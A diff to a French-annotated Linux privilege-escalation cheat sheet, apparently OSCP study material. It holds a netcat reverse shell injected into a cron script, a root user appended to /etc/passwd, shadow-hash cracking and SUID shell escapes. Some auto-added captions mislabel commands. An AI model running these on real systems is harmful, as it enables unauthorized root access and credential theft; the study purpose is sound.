@@ -10,11 +10,11 @@ Examiner les permissions, processus et configurations d'un système Linux.
 
 ## Énumération
 
-Commandes, paramètres et exemples associés à cette technique.
-
 
 **Current user**
 
+
+Commande `id` pour la rubrique « Énumération ».
 
 ```text
 id
@@ -24,6 +24,8 @@ id
 **Hostname**
 
 
+Commande `hostname` pour la rubrique « Énumération ».
+
 ```text
 hostname
 ```
@@ -32,15 +34,21 @@ hostname
 **OS versions and architecture**
 
 
+Commande `cat` pour la rubrique « Énumération ».
+
 ```text
 cat /etc/issue
 ```
 
 
+Commande `cat` pour la rubrique « Énumération ».
+
 ```text
 cat /etc/os-release
 ```
 
+
+Commande `uname` pour la rubrique « Énumération ».
 
 ```text
 uname -a
@@ -50,6 +58,8 @@ uname -a
 **Running processes**
 
 
+Commande `ps` pour la rubrique « Énumération ».
+
 ```text
 ps aux
 ```
@@ -58,10 +68,14 @@ ps aux
 **Network interfaces, routes, connections, open ports**
 
 
+Commande `ip` pour la rubrique « Énumération ».
+
 ```text
 ip a
 ```
 
+
+Commande `ss` pour la rubrique « Énumération ».
 
 ```text
 ss -anp
@@ -71,6 +85,8 @@ ss -anp
 **Firewall rules**
 
 
+Commande `cat` pour la rubrique « Énumération ».
+
 ```text
 cat /etc/iptables/rules.v4
 ```
@@ -79,15 +95,21 @@ cat /etc/iptables/rules.v4
 **Scheduled cron tasks**
 
 
+Commande `ls` pour la rubrique « Énumération ».
+
 ```text
 ls -lah /etc/cron*
 ```
 
 
+Commande `crontab` pour la rubrique « Énumération ».
+
 ```text
 crontab -l
 ```
 
+
+Commande `crontab` pour la rubrique « Énumération ».
 
 ```bash
 sudo crontab -l
@@ -97,18 +119,21 @@ sudo crontab -l
 **Installed applications**
 
 
+Commande `dpkg` pour la rubrique « Énumération ».
+
 ```text
 dpkg -l
 ```
 
 
+**Paramètres et repères :**
+`/dev/null`  
+
+
 **Sensitive writable files (excluding /dev/null )**
 
 
-```text
-/dev/null
-```
-
+Rechercher ou filtrer des données.
 
 ```text
 find / -writable -type d 2>/dev/null
@@ -118,6 +143,8 @@ find / -writable -type d 2>/dev/null
 **In memory passwords**
 
 
+Commande `strings` pour la rubrique « Énumération ».
+
 ```text
 strings /dev/mem -n10 | grep -i PASS
 ```
@@ -125,6 +152,8 @@ strings /dev/mem -n10 | grep -i PASS
 
 **Find sensitive files**
 
+
+Commande `locate` pour la rubrique « Énumération ».
 
 ```text
 locate password | more
@@ -134,15 +163,21 @@ locate password | more
 **Mounted drives**
 
 
+Commande `cat` pour la rubrique « Énumération ».
+
 ```text
 cat /etc/fstab
 ```
 
 
+Commande `mount` pour la rubrique « Énumération ».
+
 ```text
 mount
 ```
 
+
+Commande `lsblk` pour la rubrique « Énumération ».
 
 ```text
 lsblk
@@ -152,10 +187,14 @@ lsblk
 **Device drivers and kernel modules**
 
 
+Commande `lsmod` pour la rubrique « Énumération ».
+
 ```text
 lsmod
 ```
 
+
+Commande `/sbin/modinfo` pour la rubrique « Énumération ».
 
 ```text
 /sbin/modinfo <driver_name>
@@ -165,48 +204,56 @@ lsmod
 **SUID binaries**
 
 
+Rechercher ou filtrer des données.
+
 ```text
 find / -perm -u=s -type f 2>/dev/null
 ```
 
+
+Commande `-l` pour la rubrique « Énumération ».
 
 ```bash
 sudo -l
 ```
 
 
+Commande `-i` pour la rubrique « Énumération ».
+
 ```bash
 sudo -i
 ```
 
 
+**Paramètres et repères :**
+`unix-privesc-check`  
+
+
 **Automated Énumération**
 
 
-```text
-unix-privesc-check
-```
+## Examiner les services
 
 
-## Inspecting Service Footprints
-
-Commandes, paramètres et exemples associés à cette technique.
-
+Commande `watch` pour la rubrique « Examiner les services ».
 
 ```bash
 watch -n 1 "ps -aux | grep pass"
 ```
 
 
-```text
-tcpdump
-```
+**Paramètres et repères :**
+`tcpdump`  
 
+
+Commande `tcpdump` pour la rubrique « Examiner les services ».
 
 ```bash
 sudo tcpdump -i lo -A | grep "pass"
 ```
 
+
+Commande `tcpdump` pour la rubrique « Examiner les services ».
 
 ```bash
 tcpdump -i any -s0 -w capture.pcap
@@ -220,22 +267,30 @@ tcpdump -vv -i eth0 src not 10.11.1.111 and dst not 10.11.1.111
 Examiner les permissions et la configuration de Linux.
 
 
+Rechercher ou filtrer des données.
+
 ```bash
 grep "CRON" /var/log/syslog
-or
+# Autre possibilité
 cat /var/log/cron.log
 ```
 
+
+Commande `ls` pour la rubrique « Tâches cron ».
 
 ```bash
 ls -lah /path/to/script.sh
 ```
 
 
+Commande `echo` pour la rubrique « Tâches cron ».
+
 ```bash
 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [attacker_ip] [listener_port] >/tmp/f" >> /path/to/script.sh
 ```
 
+
+Commande `crontab` pour la rubrique « Tâches cron ».
 
 ```bash
 crontab -l
@@ -253,31 +308,29 @@ cat /var/spool/cron/crontabs/root
 ```
 
 
-## Fichiers de mots de passe
-
-Commandes, paramètres et exemples associés à cette technique.
-
-
 ### /etc/passwd
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `openssl` pour la rubrique « /etc/passwd ».
 
 ```bash
 openssl passwd Password123
 ```
 
 
-```text
-/etc/passwd
-```
+**Paramètres et repères :**
+`/etc/passwd`  
 
+
+Commande `echo` pour la rubrique « /etc/passwd ».
 
 ```bash
 # This is just an example using the output of the previous command.
 echo"newroot:$6$rounds=656000$6B8ZJQ4aK7G9P/8c$hx0E6ke7zxz1mUMN6LCyRJp2bV5hEE7EowzjEbLXwO6KZV7Ojo0DWg1lzCjLwWg.0tLGfhFe42NnJ8LMtBzD0:0:0:root:/root:/bin/bash">> /etc/passwd
 ```
 
+
+Commande `su` pour la rubrique « /etc/passwd ».
 
 ```bash
 su newroot
@@ -289,13 +342,15 @@ id
 
 ### /etc/shadow
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `cat` pour la rubrique « /etc/shadow ».
 
 ```bash
 cat /etc/shadow | grep [root_user] > [root_user]_hash.txt
 ```
 
+
+Analyser une empreinte avec le mode indiqué.
 
 ```bash
 # John The Ripper
@@ -306,6 +361,8 @@ hashcat -m 1800 [root_user]_hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
 
+Analyser une empreinte avec le mode indiqué.
+
 ```bash
 # John The Ripper
 john --show [root_user]_hash.txt
@@ -315,20 +372,17 @@ hashcat -m 1800 [root_user]_hash.txt /usr/share/wordlists/rockyou.txt --show
 ```
 
 
-## Setuid Binaries and Capabilities
-
-Commandes, paramètres et exemples associés à cette technique.
+### Binaires SUID
 
 
-### Setuid Binaries
-
-Commandes, paramètres et exemples associés à cette technique.
-
+Rechercher ou filtrer des données.
 
 ```bash
 find / -perm -4000 -type f 2>/dev/null
 ```
 
+
+Commande `ls` pour la rubrique « Binaires SUID ».
 
 ```bash
 ls -l $(find / -perm -4000 -type f 2>/dev/null)
@@ -337,28 +391,33 @@ ls -l $(find / -perm -4000 -type f 2>/dev/null)
 
 ### Exploiting Setuid Binaries
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `ps` pour la rubrique « Exploiting Setuid Binaries ».
 
 ```bash
 ps u -C [binary_name]
 ```
 
 
+Commande `cat` pour la rubrique « Exploiting Setuid Binaries ».
+
 ```bash
 cat /proc/[PID]/status | grep Uid
 ```
 
 
-```text
-find
-```
+**Paramètres et repères :**
+`find`  
 
+
+Rechercher ou filtrer des données.
 
 ```bash
 find [directory] -exec [path_to_shell] \;
 ```
 
+
+Rechercher ou filtrer des données.
 
 ```bash
 # Replace [vulnerable_binary] with the name of the binary you are targeting.
@@ -368,13 +427,15 @@ find / -name [vulnerable_binary] -exec /bin/bash -p \;
 
 ### Capabilities
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `/usr/sbin/getcap` pour la rubrique « Capabilities ».
 
 ```bash
 /usr/sbin/getcap -r / 2>/dev/null
 ```
 
+
+Commande `getcap` pour la rubrique « Capabilities ».
 
 ```bash
 getcap [binary_path]
@@ -384,6 +445,8 @@ getcap /usr/bin/nmap
 ```
 
 
+Commande `setcap` pour la rubrique « Capabilities ».
+
 ```bash
 setcap [capabilities] [binary_path]
 
@@ -391,6 +454,8 @@ setcap [capabilities] [binary_path]
 setcap cap_dac_override=eip /path/to/binary
 ```
 
+
+Commande `setcap` pour la rubrique « Capabilities ».
 
 ```bash
 setcap -r [binary_path]
@@ -400,9 +465,7 @@ setcap -r /usr/bin/nmap
 ```
 
 
-### Table of Capabilities
-
-Commandes, paramètres et exemples associés à cette technique.
+### Capacités Linux
 
 
 **CAP_AUDIT_CONTROL**
@@ -456,24 +519,26 @@ Bypasses file and directory read and execute permission checks. · Allows readin
 **CAP_SETUID**
 
 
-## Abusing SUDO
+## Risques liés à sudo
 
 Examiner les permissions et la configuration de Linux.
 
+
+Commande `-l` pour la rubrique « Risques liés à sudo ».
 
 ```bash
 sudo -l
 ```
 
 
+Rechercher ou filtrer des données.
+
 ```bash
 grep [process_name] /var/log/syslog
 ```
 
 
-## Kernel Exploitations
-
-Commandes, paramètres et exemples associés à cette technique.
+## Vulnérabilités du noyau
 
 
 **CVE-2010-3904**
@@ -543,43 +608,39 @@ DirtyPipe · Linux Kernel 5.8 < 5.16.11 · Exploit
 
 ## Wildcard Exploitation
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Exemple technique pour la rubrique « Wildcard Exploitation ».
 
 ```text
 *
 ```
 
 
+Exemple technique pour la rubrique « Wildcard Exploitation ».
+
 ```text
 ?
 ```
 
+
+Exemple technique pour la rubrique « Wildcard Exploitation ».
 
 ```text
 []
 ```
 
 
-### Wildcard Basics
-
-Commandes, paramètres et exemples associés à cette technique.
-
-
-### Exploitation Guide
-
-Commandes, paramètres et exemples associés à cette technique.
-
-
 ### Exploiting Wildcards in Exécution de commandes
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `ls` pour la rubrique « Exploiting Wildcards in Exécution de commandes ».
 
 ```bash
 ls /var/log/*
 ```
 
+
+Commande `tar` pour la rubrique « Exploiting Wildcards in Exécution de commandes ».
 
 ```bash
 # Example vulnerable script
@@ -589,13 +650,15 @@ tar -cvf archive.tar.gz /var/log/*
 
 ### Exploiting Wildcards in File Operations
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `touch` pour la rubrique « Exploiting Wildcards in File Operations ».
 
 ```bash
 touch /tmp/file_*
 ```
 
+
+Commande `cp` pour la rubrique « Exploiting Wildcards in File Operations ».
 
 ```bash
 # If an attacker can modify files in /etc/, they could exploit the wildcard to overwrite or manipulate critical configuration files.
@@ -605,8 +668,8 @@ cp /etc/* /tmp/backup/
 
 ## Disk Group Permissions
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `df` pour la rubrique « Disk Group Permissions ».
 
 ```text
 df -h #Find where "/" is mounted
@@ -623,6 +686,8 @@ debugfs: cat /etc/shadow
 Examiner les connexions, la configuration et les requêtes de la base de données.
 
 
+Commande `select` pour la rubrique « MySQL Élévation de privilèges ».
+
 ```sql
 select sys_exec('whoami');
 select sys_eval('whoami');
@@ -631,8 +696,8 @@ select sys_eval('whoami');
 
 ## User-Installed Software
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `/usr/local/` pour la rubrique « User-Installed Software ».
 
 ```bash
 /usr/local/
@@ -644,6 +709,8 @@ Commandes, paramètres et exemples associés à cette technique.
 /usr/src/
 ```
 
+
+Commande `dpkg` pour la rubrique « User-Installed Software ».
 
 ```bash
 # Debian/Ubuntu
@@ -662,10 +729,11 @@ pkg_info
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
 
-```text
-config.php
-```
+**Paramètres et repères :**
+`config.php`  
 
+
+Commande `root` pour la rubrique « Weak, Reused, and Plaintext Passwords ».
 
 ```bash
 root:root
@@ -678,6 +746,8 @@ username:password
 ```
 
 
+Commande `/var/mail` pour la rubrique « Weak, Reused, and Plaintext Passwords ».
+
 ```bash
 # Anything interesting in the mail folder?
 /var/mail
@@ -685,20 +755,17 @@ username:password
 ```
 
 
+Commande `./linenum.sh` pour la rubrique « Weak, Reused, and Plaintext Passwords ».
+
 ```bash
 ./LinEnum.sh -t -k password
 ```
 
 
-## Internal Services
-
-Commandes, paramètres et exemples associés à cette technique.
+### Connexions réseau actives
 
 
-### Display Active Network Connections
-
-Commandes, paramètres et exemples associés à cette technique.
-
+Commande `netstat` pour la rubrique « Connexions réseau actives ».
 
 ```bash
 # List network services
@@ -707,15 +774,10 @@ netstat -ano
 ```
 
 
-### Types of Addresses
-
-Commandes, paramètres et exemples associés à cette technique.
-
-
 ## World-Writable Scripts Invoked as Root
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Rechercher ou filtrer des données.
 
 ```bash
 # World-writable directories
@@ -733,8 +795,8 @@ find / \( -perm -o w -perm -o x \) -type d 2>/dev/null
 
 ## Unmounted FileSystems
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `mount` pour la rubrique « Unmounted FileSystems ».
 
 ```bash
 mount -l
@@ -757,6 +819,8 @@ Examiner les permissions et la configuration de Linux.
 Examiner les permissions et la configuration de Linux.
 
 
+Rechercher ou filtrer des données.
+
 ```bash
 # Find SUID files
 find / -perm -u=s -type f 2>/dev/null
@@ -768,8 +832,8 @@ find / -perm -g=s -type f 2>/dev/null
 
 ### Determining Exploitability
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `strings` pour la rubrique « Determining Exploitability ».
 
 ```bash
 # Option 1: Use strings to examine the contents.
@@ -791,6 +855,8 @@ export PATH=/tmp:$PATH
 ```
 
 
+Rechercher ou filtrer des données.
+
 ```bash
 # Find writable SUID files
 find / -perm -u=s -writable -type f 2>/dev/null
@@ -799,31 +865,29 @@ find / -perm -u=s -writable -type f 2>/dev/null
 ```
 
 
+Rechercher ou filtrer des données.
+
 ```bash
 # Find scripts in cronjobs or system directories that may have SUID or GUID set
 find /etc/cron* /var/spool/cron/ -perm -u=s -type f 2>/dev/null
 ```
 
 
-## Scripts
-
-Commandes, paramètres et exemples associés à cette technique.
-
-
 ### LinPEAS
 
-Commandes, paramètres et exemples associés à cette technique.
+
+**Paramètres et repères :**
+`./linpeas.sh`  
 
 
-```bash
-./linpeas.sh
-```
-
+Commande `./linpeas.sh` pour la rubrique « LinPEAS ».
 
 ```bash
 ./linpeas.sh | tee linpeas_output.txt
 ```
 
+
+Commande `python3` pour la rubrique « LinPEAS ».
 
 ```bash
 # 1. Download file from victim to local Kali, we could use techniques from section 17.
@@ -841,8 +905,8 @@ python3 json2pdf.py peass.json peass.pdf
 
 ### LinEnum
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `./linenum.sh` pour la rubrique « LinEnum ».
 
 ```bash
 ./LinEnum.sh
@@ -852,6 +916,8 @@ Commandes, paramètres et exemples associés à cette technique.
 ```
 
 
+Commande `./linenum.sh` pour la rubrique « LinEnum ».
+
 ```bash
 ./LinEnum.sh | tee linenum_output.txt
 ```
@@ -859,13 +925,12 @@ Commandes, paramètres et exemples associés à cette technique.
 
 ### Unix-privesc-check
 
-Commandes, paramètres et exemples associés à cette technique.
+
+**Paramètres et repères :**
+`./unix-privesc-check.sh`  
 
 
-```bash
-./unix-privesc-check.sh
-```
-
+Commande `./unix-privesc-check.sh` pour la rubrique « Unix-privesc-check ».
 
 ```bash
 ./unix-privesc-check.sh | tee unix_privesc_check_output.txt
@@ -874,8 +939,8 @@ Commandes, paramètres et exemples associés à cette technique.
 
 ### Checksec
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `checksec` pour la rubrique « Checksec ».
 
 ```bash
 checksec --all
@@ -884,8 +949,8 @@ checksec --all
 
 ### Peepdf
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `peepdf.py` pour la rubrique « Peepdf ».
 
 ```bash
 peepdf.py file.pdf
@@ -894,14 +959,15 @@ peepdf.py file.pdf
 
 ### Exploit Suggester
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `python3` pour la rubrique « Exploit Suggester ».
 
 ```bash
 python3 exploit-suggester.py
 ```
 
-
 ---
 
 Source documentaire : [OSCP+ Cheatsheet d'Emmanuel Solis](https://www.emmanuelsolis.com/oscp.html).
+
+<!-- refined-oscp -->
